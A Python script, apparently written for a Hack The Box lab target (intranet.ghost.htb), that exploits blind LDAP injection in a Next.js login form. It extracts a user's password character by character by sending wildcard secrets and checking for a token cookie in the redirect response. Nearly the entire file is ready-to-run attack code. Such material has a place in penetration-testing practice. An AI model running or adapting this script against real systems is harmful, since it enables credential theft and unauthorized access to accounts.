#!/usr/bin/env python3
"""
Blind LDAP injection – extract password character by character.
Usage: python ldap_injec.py <username> [-v]
"""

import requests
import sys
import string
import time
import getopt

URL = "http://intranet.ghost.htb:8008/login"
ACTION_ID = "c471eb076ccac91d6f828b671795550fd5925940"
ACTION_KEY = "k2982904007"

HEADERS = {
    "Host": "intranet.ghost.htb:8008",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/x-component",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://intranet.ghost.htb:8008/login",
    "Next-Action": ACTION_ID,
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "Origin": "http://intranet.ghost.htb:8008",
    "Connection": "keep-alive",
    "Priority": "u=0",
}

CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"

def send_login(username, secret, verbose=False):
    data = {
        "1_$ACTION_REF_1": "",
        "1_$ACTION_1:0": f'{{"id":"{ACTION_ID}","bound":"$@1"}}',
        "1_$ACTION_1:1": "[{}]",
        "1_$ACTION_KEY": ACTION_KEY,
        "1_ldap-username": username,
        "1_ldap-secret": secret,
        "0": '[{},"$K1"]'
    }
    files = {k: (None, v) for k, v in data.items()}
    try:
        resp = requests.post(URL, headers=HEADERS, files=files,
                             allow_redirects=False, timeout=10)
        if resp.status_code == 303 and "Set-Cookie" in resp.headers:
            if "token" in resp.headers["Set-Cookie"]:
                return True
        return False
    except requests.RequestException as e:
        if verbose:
            print(f"\n[!] Request error: {e}")
        return False

def extract_password(username, verbose=False):
    prefix = ""
    print(f"[*] Extracting password for user: {username}")
    while True:
        found = False
        for ch in CHARSET:
            test_secret = prefix + ch + "*"
            if verbose:
                print(f"[*] Trying: {test_secret}", end=" ", flush=True)
            if send_login(username, test_secret, verbose):
                if verbose:
                    print("✅ MATCH")
                else:
                    print(f"[+] Found character: {ch} (current: {prefix + ch})")
                prefix += ch
                found = True
                break
            else:
                if verbose:
                    print("❌ no")
        if not found:
            # No more characters matched – test exact prefix
            if verbose:
                print(f"[*] Testing exact prefix: {prefix}")
            if send_login(username, prefix, verbose):
                print(f"[+] Password found: {prefix}")
                return prefix
            else:
                print("[!] Exact match failed. Password may contain characters not in CHARSET.")
                return prefix  # return what we have
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)

def usage():
    print("Usage: python ldap_injec.py <username> [-v]")
    print("  -v   verbose mode (show all attempts)")

if __name__ == "__main__":
    try:
        opts, args = getopt.getopt(sys.argv[1:], "v")
    except getopt.GetoptError:
        usage()
        sys.exit(1)

    verbose = False
    for o, _ in opts:
        if o == "-v":
            verbose = True

    if len(args) < 1:
        usage()
        sys.exit(1)

    target_user = args[0]
    password = extract_password(target_user, verbose)
    print(f"\n[+] Final password for {target_user}: {password}")
